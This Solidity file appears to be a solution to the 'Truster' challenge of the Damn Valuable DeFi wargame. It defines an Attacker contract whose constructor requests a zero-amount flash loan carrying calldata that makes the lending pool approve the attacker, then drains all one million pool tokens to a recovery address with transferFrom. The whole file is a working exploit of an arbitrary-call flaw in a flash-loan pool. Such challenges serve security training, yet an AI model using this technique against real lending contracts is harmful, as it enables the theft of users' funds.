// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {DamnValuableToken} from "./DamnValuableToken.sol"; 
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract Attacker {
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(TrusterLenderPool pool,address _token,address recovery){
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)",address(this),TOKENS_IN_POOL);
        pool.flashLoan(0,address(this), _token,data);
        DamnValuableToken token = DamnValuableToken(_token);
        token.transferFrom(address(pool),recovery,TOKENS_IN_POOL);
    }
}